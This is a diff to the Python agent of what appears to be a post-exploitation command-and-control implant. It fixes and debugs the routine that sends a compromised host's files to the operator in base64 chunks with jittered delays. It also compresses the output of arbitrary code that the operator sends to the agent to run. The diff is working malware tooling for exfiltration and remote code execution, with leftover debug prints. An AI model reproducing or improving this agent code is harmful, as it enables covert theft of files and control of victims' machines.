@@ -249,13 +249,13 @@ def processPacket(taskingID, data):
 
         offset = 0
         size = os.path.getsize(filePath)
+        print "file size " + str(size)
+        partIndex = 0
 
         while True:
 
-            partIndex = 0
-
             # get 512kb of the given file starting at the specified offset
-            encodedPart = get_file_part(filePath, offset, base64=False)
+            encodedPart = get_file_part(filePath, offset=offset, base64=False)
             c = compress()
             start_crc32 = c.crc32_data(encodedPart)
             comp_data = c.comp_data(encodedPart)
@@ -263,8 +263,9 @@ def processPacket(taskingID, data):
             encodedPart = base64.b64encode(encodedPart)
 
             partData = "%s|%s|%s" %(partIndex, filePath, encodedPart)
-
+            print len(encodedPart)
             if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
+                print "here"
                 break
 
             sendMessage(encodePacket(41, partData))
@@ -278,7 +279,6 @@ def processPacket(taskingID, data):
             maxSleep = int((1.0+jitter)*delay)
             sleepTime = random.randint(minSleep, maxSleep)
             time.sleep(sleepTime)
-
             partIndex += 1
             offset += 5120000
 
@@ -347,14 +347,18 @@ def processPacket(taskingID, data):
         prefix = data[0:15].strip()
         extension = data[15:20].strip()
         data = data[20:]
-
         try:
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(data, '<string>', 'exec')
             exec code_obj in globals()
             sys.stdout = sys.__stdout__
-            return encodePacket(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + str(buffer.getvalue()) )
+            c = compress()
+            start_crc32 = c.crc32_data(buffer.getvalue())
+            comp_data = c.comp_data(buffer.getvalue())
+            encodedPart = c.build_header(comp_data, start_crc32)
+            encodedPart = base64.b64encode(encodedPart)
+            return encodePacket(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart )
         except Exception as e:
             # Also return partial code that has been executed
             errorData = str(buffer.getvalue())
@@ -694,7 +698,8 @@ def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
         return ''
 
     f = open(filePath, 'rb')
-    f.seek(offset, 1)
+    print offset
+    f.seek(offset, 0)
     data = f.read(chunkSize)
     f.close()
     if base64: 
